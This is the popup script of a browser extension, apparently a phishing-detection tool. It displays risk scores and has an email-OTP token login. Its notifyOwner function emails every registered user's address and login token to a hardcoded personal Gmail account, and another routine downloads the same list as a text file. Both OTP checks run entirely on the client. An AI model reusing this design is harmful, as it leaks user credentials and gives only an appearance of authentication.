// ╔══════════════════════════════════════════════════════╗
// ║       GhostPhish Pro v3.0 — popup.js                 ║
// ╚══════════════════════════════════════════════════════╝

const COLORS = {
  CRITICAL: { primary:'#ff0000', glow:'rgba(255,0,0,.5)',   pill:'pill-CRITICAL' },
  HIGH:     { primary:'#ff5500', glow:'rgba(255,85,0,.5)',  pill:'pill-HIGH'     },
  MEDIUM:   { primary:'#ffaa00', glow:'rgba(255,170,0,.4)', pill:'pill-MEDIUM'   },
  LOW:      { primary:'#00ee77', glow:'rgba(0,238,119,.3)', pill:'pill-LOW'      },
};

// FIX: HTML escaping helper — prevents XSS in innerHTML insertions
function escapeHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}

// ── Tabs ─────────────────────────────────────────────
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    tab.classList.add('active');
    document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
  });
});

// ── ON/OFF Toggle ─────────────────────────────────────
const toggle = document.getElementById('mainToggle');
const toggleLabel = document.getElementById('toggleLabel');

chrome.runtime.sendMessage({ action: 'getState' }, res => {
  applyToggleUI(res?.enabled !== false);
});

toggle.addEventListener('click', () => {
  chrome.runtime.sendMessage({ action: 'toggle' }, res => {
    applyToggleUI(res?.enabled);
  });
});

function applyToggleUI(enabled) {
  toggle.className = 'toggle ' + (enabled ? 'on' : 'off');
  toggleLabel.textContent = enabled ? 'ON' : 'OFF';
  toggleLabel.style.color = enabled ? 'var(--green)' : 'var(--dim)';
}

// ── Arc Canvas ───────────────────────────────────────
function drawArc(score, color) {
  const canvas = document.getElementById('arcCanvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  const cx = W / 2, cy = H - 8, r = 58;

  ctx.clearRect(0, 0, W, H);

  // Track
  ctx.beginPath();
  ctx.arc(cx, cy, r, Math.PI, 0, false);
  ctx.lineWidth = 7; ctx.strokeStyle = '#141a20'; ctx.lineCap = 'round';
  ctx.stroke();

  // Fill
  const pct = Math.min(score / 20, 1);
  const end = Math.PI + pct * Math.PI;
  const g = ctx.createLinearGradient(cx - r, cy, cx + r, cy);
  g.addColorStop(0, '#002210');
  g.addColorStop(0.5, '#ff6600');
  g.addColorStop(1, color);
  ctx.beginPath();
  ctx.arc(cx, cy, r, Math.PI, end, false);
  ctx.lineWidth = 7; ctx.strokeStyle = g; ctx.lineCap = 'round';
  ctx.shadowColor = color; ctx.shadowBlur = 10;
  ctx.stroke();
  ctx.shadowBlur = 0;

  // Ticks
  for (let i = 0; i <= 10; i++) {
    const a = Math.PI + (i / 10) * Math.PI;
    ctx.beginPath();
    ctx.moveTo(cx + (r - 14) * Math.cos(a), cy + (r - 14) * Math.sin(a));
    ctx.lineTo(cx + (r - 10) * Math.cos(a), cy + (r - 10) * Math.sin(a));
    ctx.lineWidth = 1; ctx.strokeStyle = '#1a2530'; ctx.shadowBlur = 0;
    ctx.stroke();
  }
}

// ── Render Scan Result ────────────────────────────────
function renderResult(data, prefix = '') {
  const { score = 0, reasons = [], level, url } = data;
  const lv = level || resolveLevel(score);
  const c  = COLORS[lv] || COLORS.LOW;

  // Pill
  const pill = document.getElementById(prefix + 'riskPill');
  if (pill) { pill.textContent = lv; pill.className = `risk-pill ${c.pill}`; }

  // Arc + score
  const numEl = document.getElementById(prefix + 'scoreNum');
  if (numEl) {
    numEl.style.color = c.primary;
    numEl.style.textShadow = `0 0 18px ${c.glow}`;
    animateCount(numEl, score, c.primary);
  }

  // Bars
  const urlPct = Math.min((score / 20) * 100, 100);
  const entPct = reasons.some(r => /entropy/i.test(r)) ? 70 : 20;
  const domPct = reasons.some(r => /form|password|keylog|clipboard|imperson/i.test(r)) ? 80 : 12;
  setTimeout(() => {
    setBar(prefix + 'bUrl', urlPct);
    setBar(prefix + 'bEnt', entPct);
    setBar(prefix + 'bDom', domPct);
  }, 80);

  // URL
  const urlBox = document.getElementById(prefix + 'urlBox');
  if (urlBox) urlBox.textContent = url || '—';

  // Reasons
  const wrap = document.getElementById(prefix + 'reasonsWrap');
  if (wrap) {
    if (!reasons.length) {
      wrap.innerHTML = `<div class="no-threat">✓ No suspicious signals detected</div>`;
    } else {
      // FIX: Escape reasons before inserting into innerHTML
      wrap.innerHTML =
        `<div class="reasons-title">THREAT SIGNALS (${reasons.length})</div>` +
        reasons.slice(0, 6).map(r =>
          `<div class="reason" style="border-color:${c.primary}33;color:${c.primary}bb;background:${c.primary}08">
            ⚡ ${escapeHtml(r)}
           </div>`
        ).join('');
    }
  }
}

function animateCount(el, target, color) {
  let cur = 0;
  const step = Math.max(1, Math.ceil(target / 18));
  const draw = () => {
    cur = Math.min(cur + step, target);
    el.textContent = cur;
    drawArc(cur, color);
    if (cur < target) requestAnimationFrame(draw);
  };
  requestAnimationFrame(draw);
}

function setBar(id, pct) {
  const el = document.getElementById(id);
  if (el) el.style.width = Math.min(pct, 100) + '%';
}

function resolveLevel(score) {
  if (score >= 12) return 'CRITICAL';
  if (score >= 7)  return 'HIGH';
  if (score >= 4)  return 'MEDIUM';
  return 'LOW';
}

// ── Load Current Tab ──────────────────────────────────
function loadScan() {
  chrome.runtime.sendMessage({ action: 'getResult' }, res => {
    if (!res || res.error) return;
    renderResult(res);
  });
}

// ── Rescan Button ─────────────────────────────────────
document.getElementById('rescanBtn').addEventListener('click', () => {
  const btn = document.getElementById('rescanBtn');
  btn.disabled = true;
  btn.textContent = '🔬 DEEP SCANNING...';
  drawArc(0, '#222');
  const numEl = document.getElementById('scoreNum');
  numEl.textContent = '--'; numEl.style.color = '#2a3a4a';

  // Deep scan — page content bhi check karo
  chrome.runtime.sendMessage({ action: 'deepRescan' }, res => {
    if (res && !res.error) renderResult(res);
    setTimeout(() => {
      loadScan();
      btn.disabled = false;
      btn.textContent = '🔬 DEEP RESCAN'; // Restore button text
    }, 2500);
  });
});

// ── Manual Scan ───────────────────────────────────────
document.getElementById('manualScanBtn').addEventListener('click', () => {
  const url = document.getElementById('manualUrl').value.trim();
  if (!url) return;

  const resultDiv = document.getElementById('manualResult');
  resultDiv.innerHTML = `<div style="color:#334455;font-size:11px;padding:8px 0">⟳ Scanning...</div>`;

  chrome.runtime.sendMessage({ action: 'scanUrl', url }, res => {
    if (!res) {
      resultDiv.innerHTML = '<div style="color:#aa3322;font-size:11px">Error scanning URL</div>';
      return;
    }
    const lv = res.level || resolveLevel(res.score);
    const c  = COLORS[lv] || COLORS.LOW;
    // FIX: Escape user-supplied URL before inserting into innerHTML
    const safeUrl = escapeHtml(url);

    resultDiv.innerHTML = `
      <div style="background:#0a0c10;border:1px solid ${c.primary}33;padding:12px;margin-top:4px">
        <div style="display:flex;justify-content:space-between;margin-bottom:8px">
          <span style="font-size:10px;color:#334455">RESULT</span>
          <span style="font-size:10px;padding:2px 8px;background:${c.primary}15;
            color:${c.primary};border:1px solid ${c.primary}44">${lv}</span>
        </div>
        <div style="font-size:22px;font-family:'Orbitron',monospace;color:${c.primary};
          text-shadow:0 0 14px ${c.glow};text-align:center;margin:6px 0">
          ${res.score}
        </div>
        <div style="font-size:9px;color:#334455;word-break:break-all;margin-bottom:8px">${safeUrl}</div>
        ${(res.reasons||[]).slice(0,4).map(r=>
          `<div style="font-size:10px;padding:3px 6px;border-left:2px solid ${c.primary}44;
            margin:2px 0;color:${c.primary}99">⚡ ${escapeHtml(r)}</div>`
        ).join('')}
      </div>
    `;
  });
});

// Enter key in manual input
document.getElementById('manualUrl').addEventListener('keydown', e => {
  if (e.key === 'Enter') document.getElementById('manualScanBtn').click();
});

// ── Backend Health Check ──────────────────────────────
async function checkBackend() {
  const el = document.getElementById('backendStatus');
  if (!el) return;
  try {
    const res = await fetch('http://127.0.0.1:5000/', { signal: AbortSignal.timeout(2000) });
    if (res.ok) {
      el.innerHTML = `<span class="backend-dot dot-on"></span><span style="color:var(--green)">Online</span>`;
    } else throw new Error();
  } catch {
    el.innerHTML = `<span class="backend-dot dot-off"></span><span style="color:#443333">Offline</span>`;
  }
}

// ── Init ─────────────────────────────────────────────
drawArc(0, '#1a2530');
loadScan();
checkBackend();


// ══════════════════════════════════════════════════════
// TOKEN SYSTEM — EmailJS REST API (No SDK, No CSP issue)
// ══════════════════════════════════════════════════════
// 🔧 emailjs.com pe account banao, 3 values yahan bharo:

const EMAILJS_SERVICE_ID  = 'service_h4obcdl';
const EMAILJS_TEMPLATE_ID = 'template_fa41fqk';         // User ko OTP bhejne ka template
const EMAILJS_PUBLIC_KEY  = '244X30qRU6mDAyZ8v';

// 🔧 APNI EMAIL YAHAN DAALO
const OWNER_EMAIL         = 'jaysjoshi47@gmail.com';
const OWNER_TEMPLATE_ID   = 'template_kvucrqh';

// ✅ Direct REST API — koi library nahi chahiye
async function sendOTPEmail(email, otp) {

  // ── Config check ──────────────────────────────────
  if (EMAILJS_SERVICE_ID  === 'YOUR_SERVICE_ID')  throw new Error('SERVICE_ID fill nahi ki popup.js mein');
  if (EMAILJS_TEMPLATE_ID === 'YOUR_TEMPLATE_ID') throw new Error('TEMPLATE_ID fill nahi ki popup.js mein');
  if (EMAILJS_PUBLIC_KEY  === 'YOUR_PUBLIC_KEY')  throw new Error('PUBLIC_KEY fill nahi ki popup.js mein');

  const res = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
    method : 'POST',
    headers: { 'Content-Type': 'application/json' },
    body   : JSON.stringify({
      service_id  : EMAILJS_SERVICE_ID,
      template_id : EMAILJS_TEMPLATE_ID,
      user_id     : EMAILJS_PUBLIC_KEY,
      template_params: {
        to_email : email,
        otp_code : otp,
        app_name : 'GhostPhish Pro'
      }
    })
  });

  if (!res.ok) {
    const txt = await res.text();
    // EmailJS ke common errors explain karo
    if (txt.includes('service'))  throw new Error(`Service ID galat hai: "${EMAILJS_SERVICE_ID}"`);
    if (txt.includes('template')) throw new Error(`Template ID galat hai: "${EMAILJS_TEMPLATE_ID}"`);
    if (txt.includes('user'))     throw new Error(`Public Key galat hai`);
    if (res.status === 403)       throw new Error('EmailJS account blocked ya free limit khatam');
    if (res.status === 422)       throw new Error('Template mein {{to_email}} ya {{otp_code}} variable nahi hai');
    throw new Error(`EmailJS Error ${res.status}: ${txt}`);
  }
  return true;
}

// ✅ Owner ko notification bhejo — naya user register hua
async function notifyOwner(userEmail, token, allUsers) {
  if (!OWNER_EMAIL || OWNER_EMAIL === 'YOUR_EMAIL@gmail.com') return;
  if (!OWNER_TEMPLATE_ID || OWNER_TEMPLATE_ID === 'YOUR_OWNER_TEMPLATE_ID') return;

  // Saare users ki list banao
  const userList = Object.entries(allUsers)
    .map(([em, info]) => {
      const d = new Date(info.created).toLocaleString('en-IN');
      return `${em}  |  ${info.token}  |  ${d}`;
    })
    .join('\n');

  try {
    await fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method : 'POST',
      headers: { 'Content-Type': 'application/json' },
      body   : JSON.stringify({
        service_id  : EMAILJS_SERVICE_ID,
        template_id : OWNER_TEMPLATE_ID,
        user_id     : EMAILJS_PUBLIC_KEY,
        template_params: {
          owner_email : OWNER_EMAIL,   // ✅ Template mein {{owner_email}} hai
          new_user    : userEmail,
          new_token   : token,
          total_users : Object.keys(allUsers).length,
          user_list   : userList,
          timestamp   : new Date().toLocaleString('en-IN')
        }
      })
    });
  } catch { /* owner notification fail hone se user pe koi asar nahi */ }
}
let currentEmail = null;
let currentOtp   = null;
let currentOtpExpiry = 0;      // FIX: OTP expiry timestamp (5 minutes)
let otpAttempts  = 0;          // FIX: Brute-force protection counter
const OTP_MAX_ATTEMPTS = 5;
const OTP_EXPIRY_MS    = 5 * 60 * 1000; // 5 minutes

// FIX: Cryptographically secure OTP generation
function generateOTP() {
  const arr = new Uint32Array(1);
  crypto.getRandomValues(arr);
  return String(100000 + (arr[0] % 900000));
}

// FIX: Cryptographically secure token generation — unbiased rejection sampling
function generateToken(email) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const max   = 256 - (256 % chars.length); // rejection threshold to remove modulo bias
  let rand = '';
  while (rand.length < 32) {
    const arr = new Uint8Array(64);
    crypto.getRandomValues(arr);
    for (let i = 0; i < arr.length && rand.length < 32; i++) {
      if (arr[i] < max) rand += chars[arr[i] % chars.length];
    }
  }
  return `GP-${Date.now().toString(36).toUpperCase()}-${rand}`;
}

function showMsg(id, text, type) {
  const el = document.getElementById(id);
  el.textContent = text; el.className = `modal-msg ${type}`; el.style.display = 'block';
}

function isValidEmail(e) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }

// ── Open / Close ──────────────────────────────────────
document.getElementById('openCreateToken').addEventListener('click', () => {
  document.getElementById('createTokenModal').classList.add('show');
});
document.getElementById('closeCreate').addEventListener('click', () => {
  document.getElementById('createTokenModal').classList.remove('show');
  document.getElementById('ct-step1').style.display = 'block';
  document.getElementById('ct-step2').style.display = 'none';
  document.getElementById('ct-msg').style.display = 'none';
  document.getElementById('ct-token-display').style.display = 'none';
  document.getElementById('ct-email').value = '';
  document.getElementById('ct-otp').value = '';
  currentOtp = null; currentEmail = null;
  currentOtpExpiry = 0; otpAttempts = 0;
});
document.getElementById('openLoginToken').addEventListener('click', () => {
  document.getElementById('loginTokenModal').classList.add('show');
});
document.getElementById('closeLogin').addEventListener('click', () => {
  document.getElementById('loginTokenModal').classList.remove('show');
  // Reset all steps
  document.getElementById('lt-step1').style.display          = 'block';
  document.getElementById('lt-forgot-stepA').style.display   = 'none';
  document.getElementById('lt-forgot-stepB').style.display   = 'none';
  document.getElementById('lt-forgot-result').style.display  = 'none';
  document.getElementById('lt-msg').style.display            = 'none';
  document.getElementById('lt-success-display').style.display= 'none';
  document.getElementById('lt-token').value       = '';
  document.getElementById('lt-forgot-email').value= '';
  document.getElementById('lt-forgot-otp').value  = '';
  ltForgotOtp = null; ltForgotEmail = null;
  ltForgotOtpExpiry = 0; ltForgotAttempts = 0;
});

// ── SEND OTP ──────────────────────────────────────────
document.getElementById('sendOtpBtn').addEventListener('click', async () => {
  const email = document.getElementById('ct-email').value.trim();
  if (!email)              return showMsg('ct-msg', '⚠ Email required', 'error');
  if (!isValidEmail(email)) return showMsg('ct-msg', '⚠ Invalid email format', 'error');

  chrome.storage.local.get(['gp_users'], async (data) => {
    const users = data.gp_users || {};
    if (users[email]) return showMsg('ct-msg', '⚠ Email already registered', 'error');

    const btn = document.getElementById('sendOtpBtn');
    btn.disabled = true; btn.textContent = '📧 Sending...';
    showMsg('ct-msg', '⟳ Sending OTP to your email...', 'success');

    currentOtp   = generateOTP();
    currentEmail = email;
    currentOtpExpiry = Date.now() + OTP_EXPIRY_MS; // FIX: Set expiry
    otpAttempts  = 0;                               // FIX: Reset attempts

    try {
      await sendOTPEmail(email, currentOtp);
      document.getElementById('ct-step1').style.display = 'none';
      document.getElementById('ct-step2').style.display = 'block';
      document.getElementById('ct-email-show').textContent = `OTP sent to: ${email}`;
      showMsg('ct-msg', '✓ OTP sent! Check your inbox.', 'success');
    } catch (err) {
      showMsg('ct-msg', '✕ Email send failed. Check EmailJS config.', 'error');
      currentOtp = null;
    }
    btn.disabled = false; btn.textContent = '📧 SEND OTP';
  });
});

// ── RESEND OTP ────────────────────────────────────────
document.getElementById('resendOtp').addEventListener('click', async () => {
  if (!currentEmail) return;
  currentOtp = generateOTP();
  currentOtpExpiry = Date.now() + OTP_EXPIRY_MS; // FIX: Reset expiry on resend
  otpAttempts = 0;                                // FIX: Reset attempts on resend
  document.getElementById('ct-otp').value = '';
  showMsg('ct-msg', '⟳ Resending OTP...', 'success');
  try {
    await sendOTPEmail(currentEmail, currentOtp);
    showMsg('ct-msg', '✓ New OTP sent!', 'success');
  } catch {
    showMsg('ct-msg', '✕ Resend failed.', 'error');
  }
});


// ── AUTO TXT FILE SAVE ────────────────────────────────
function autoSaveTxtFile(users) {
  const lines = [
    '╔══════════════════════════════════════════════════════╗',
    '║        GHOSTPHISH PRO — User Token Database          ║',
    `║        Last Updated: ${new Date().toLocaleString('en-IN')}`,
    '╚══════════════════════════════════════════════════════╝',
    '',
    'EMAIL                                    | TOKEN',
    '─'.repeat(80),
  ];

  Object.entries(users).forEach(([email, info]) => {
    const date = new Date(info.created).toLocaleString('en-IN');
    lines.push(`${email.padEnd(40)} | ${info.token}`);
    lines.push(`${''.padEnd(40)} | Created: ${date}`);
    lines.push('─'.repeat(80));
  });

  lines.push('');
  lines.push(`Total Users: ${Object.keys(users).length}`);

  const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement('a');
  a.href     = url;
  a.download = 'ghostphish_users.txt';
  a.click();
  URL.revokeObjectURL(url);
}

// ── VERIFY OTP ────────────────────────────────────────
document.getElementById('verifyOtpBtn').addEventListener('click', () => {
  const entered = document.getElementById('ct-otp').value.trim();
  if (!entered)             return showMsg('ct-msg', '⚠ Enter OTP', 'error');
  if (entered.length !== 6) return showMsg('ct-msg', '⚠ OTP must be 6 digits', 'error');
  if (!currentOtp)          return showMsg('ct-msg', '⚠ Request a new OTP', 'error');

  // FIX: Check OTP expiry (5 minutes)
  if (Date.now() > currentOtpExpiry) {
    currentOtp = null;
    return showMsg('ct-msg', '✕ OTP expired. Please resend.', 'error');
  }

  // FIX: Brute-force protection — max 5 attempts
  otpAttempts++;
  if (otpAttempts > OTP_MAX_ATTEMPTS) {
    currentOtp = null;
    return showMsg('ct-msg', '✕ Too many attempts. Request a new OTP.', 'error');
  }

  if (entered !== currentOtp) return showMsg('ct-msg', '✕ Wrong OTP. Try again.', 'error');

  const token = generateToken(currentEmail);
  chrome.storage.local.get(['gp_users'], (data) => {
    if (chrome.runtime.lastError) return showMsg('ct-msg', '✕ Storage error', 'error');
    const users = data.gp_users || {};
    users[currentEmail] = { token, created: Date.now() };
    chrome.storage.local.set({ gp_users: users, gp_active: currentEmail }, () => {
      if (chrome.runtime.lastError) return showMsg('ct-msg', '✕ Save failed', 'error');
      document.getElementById('ct-step2').style.display = 'none';
      document.getElementById('ct-token-value').textContent = token;
      document.getElementById('ct-token-display').style.display = 'block';
      showMsg('ct-msg', '✓ OTP Verified! Token generated. File saving...', 'success');
      currentOtp = null;

      // ✅ Auto save TXT file with all users
      autoSaveTxtFile(users);

      // ✅ Owner ko email notification bhejo
      notifyOwner(currentEmail, token, users);
    });
  });
});

// ── COPY TOKEN ────────────────────────────────────────
document.getElementById('copyTokenBtn').addEventListener('click', () => {
  const token = document.getElementById('ct-token-value').textContent;
  navigator.clipboard.writeText(token).then(() => {
    const btn = document.getElementById('copyTokenBtn');
    btn.textContent = '✓ COPIED!';
    setTimeout(() => btn.textContent = '⎘ COPY TOKEN', 1500);
  });
});

// ── LOGIN WITH TOKEN ──────────────────────────────────
document.getElementById('loginTokenBtn').addEventListener('click', () => {
  const token = document.getElementById('lt-token').value.trim();
  if (!token) return showMsg('lt-msg', '⚠ Token required', 'error');
  chrome.storage.local.get(['gp_users'], (data) => {
    if (chrome.runtime.lastError) return showMsg('lt-msg', '✕ Storage error', 'error');
    const users = data.gp_users || {};
    const found = Object.entries(users).find(([, info]) => info.token === token);
    if (!found) return showMsg('lt-msg', '✕ Invalid token.', 'error');
    const [email] = found;
    chrome.storage.local.set({ gp_active: email }, () => {
      if (chrome.runtime.lastError) return showMsg('lt-msg', '✕ Login failed', 'error');
      document.getElementById('lt-logged-email').textContent = email;
      document.getElementById('lt-success-display').style.display = 'block';
      showMsg('lt-msg', '✓ Token verified! Logged in.', 'success');
    });
  });
});

// ── OPEN HISTORY PAGE ─────────────────────────────────
document.getElementById('openHistoryBtn').addEventListener('click', () => {
  chrome.tabs.create({ url: chrome.runtime.getURL('history.html') });
});

// ══════════════════════════════════════════════════════
// FORGOT TOKEN — Email OTP se token recover karo
// ══════════════════════════════════════════════════════

let ltForgotEmail    = null;
let ltForgotOtp      = null;
let ltForgotOtpExpiry = 0;
let ltForgotAttempts = 0;

function ltShowMsg(text, type) { showMsg('lt-msg', text, type); }

// ── Helper: Reset forgot flow panels ──────────────────
function ltResetForgot() {
  document.getElementById('lt-forgot-stepA').style.display  = 'none';
  document.getElementById('lt-forgot-stepB').style.display  = 'none';
  document.getElementById('lt-forgot-result').style.display = 'none';
  document.getElementById('lt-forgot-email').value = '';
  document.getElementById('lt-forgot-otp').value   = '';
  ltForgotOtp = null; ltForgotEmail = null;
  ltForgotOtpExpiry = 0; ltForgotAttempts = 0;
}

// ── "Forgot Token?" link ───────────────────────────────
document.getElementById('forgotTokenLink').addEventListener('click', () => {
  document.getElementById('lt-step1').style.display        = 'none';
  document.getElementById('lt-success-display').style.display = 'none';
  document.getElementById('lt-msg').style.display          = 'none';
  document.getElementById('lt-forgot-stepA').style.display = 'block';
  document.getElementById('lt-forgot-email').focus();
});

// ── "Back to Login" link ──────────────────────────────
document.getElementById('backToLoginLink').addEventListener('click', () => {
  ltResetForgot();
  document.getElementById('lt-step1').style.display = 'block';
  document.getElementById('lt-msg').style.display   = 'none';
});

// ── SEND OTP (Forgot Token) ───────────────────────────
document.getElementById('lt-sendOtpBtn').addEventListener('click', async () => {
  const email = document.getElementById('lt-forgot-email').value.trim();
  if (!email)               return ltShowMsg('⚠ Email required', 'error');
  if (!isValidEmail(email)) return ltShowMsg('⚠ Invalid email format', 'error');

  // Check email is registered
  chrome.storage.local.get(['gp_users'], async (data) => {
    if (chrome.runtime.lastError) return ltShowMsg('✕ Storage error', 'error');
    const users = data.gp_users || {};
    if (!users[email]) return ltShowMsg('✕ Email not registered', 'error');

    const btn = document.getElementById('lt-sendOtpBtn');
    btn.disabled = true; btn.textContent = '📧 Sending...';
    ltShowMsg('⟳ Sending OTP...', 'success');

    ltForgotOtp      = generateOTP();
    ltForgotEmail    = email;
    ltForgotOtpExpiry = Date.now() + OTP_EXPIRY_MS;
    ltForgotAttempts = 0;

    try {
      await sendOTPEmail(email, ltForgotOtp);
      document.getElementById('lt-forgot-stepA').style.display = 'none';
      document.getElementById('lt-forgot-stepB').style.display = 'block';
      document.getElementById('lt-otp-sent-to').textContent = `OTP sent to: ${email}`;
      ltShowMsg('✓ OTP sent! Check your inbox.', 'success');
    } catch (err) {
      ltShowMsg('✕ Email send failed. Check EmailJS config.', 'error');
      ltForgotOtp = null;
    }
    btn.disabled = false; btn.textContent = '📧 SEND OTP';
  });
});

// ── RESEND OTP (Forgot Token) ─────────────────────────
document.getElementById('lt-resendOtp').addEventListener('click', async () => {
  if (!ltForgotEmail) return;
  ltForgotOtp      = generateOTP();
  ltForgotOtpExpiry = Date.now() + OTP_EXPIRY_MS;
  ltForgotAttempts = 0;
  document.getElementById('lt-forgot-otp').value = '';
  ltShowMsg('⟳ Resending OTP...', 'success');
  try {
    await sendOTPEmail(ltForgotEmail, ltForgotOtp);
    ltShowMsg('✓ New OTP sent!', 'success');
  } catch {
    ltShowMsg('✕ Resend failed.', 'error');
  }
});

// ── VERIFY OTP & RECOVER TOKEN ────────────────────────
document.getElementById('lt-verifyOtpBtn').addEventListener('click', () => {
  const entered = document.getElementById('lt-forgot-otp').value.trim();
  if (!entered)             return ltShowMsg('⚠ Enter OTP', 'error');
  if (entered.length !== 6) return ltShowMsg('⚠ OTP must be 6 digits', 'error');
  if (!ltForgotOtp)         return ltShowMsg('⚠ Request a new OTP', 'error');

  // Expiry check
  if (Date.now() > ltForgotOtpExpiry) {
    ltForgotOtp = null;
    return ltShowMsg('✕ OTP expired. Please resend.', 'error');
  }

  // Brute-force protection
  ltForgotAttempts++;
  if (ltForgotAttempts > OTP_MAX_ATTEMPTS) {
    ltForgotOtp = null;
    return ltShowMsg('✕ Too many attempts. Request a new OTP.', 'error');
  }

  if (entered !== ltForgotOtp) return ltShowMsg('✕ Wrong OTP. Try again.', 'error');

  // OTP correct — fetch & show token
  chrome.storage.local.get(['gp_users'], (data) => {
    if (chrome.runtime.lastError) return ltShowMsg('✕ Storage error', 'error');
    const users = data.gp_users || {};
    const userInfo = users[ltForgotEmail];
    if (!userInfo) return ltShowMsg('✕ Account not found', 'error');

    ltForgotOtp = null; // Invalidate OTP after use

    document.getElementById('lt-forgot-stepB').style.display  = 'none';
    document.getElementById('lt-recovered-token').textContent = userInfo.token;
    document.getElementById('lt-forgot-result').style.display = 'block';
    ltShowMsg('✓ OTP verified! Token recovered below.', 'success');
  });
});

// ── COPY RECOVERED TOKEN ──────────────────────────────
document.getElementById('lt-copyTokenBtn').addEventListener('click', () => {
  const token = document.getElementById('lt-recovered-token').textContent;
  navigator.clipboard.writeText(token).then(() => {
    const btn = document.getElementById('lt-copyTokenBtn');
    btn.textContent = '✓ COPIED!';
    setTimeout(() => btn.textContent = '⎘ COPY TOKEN', 1500);
  });
});
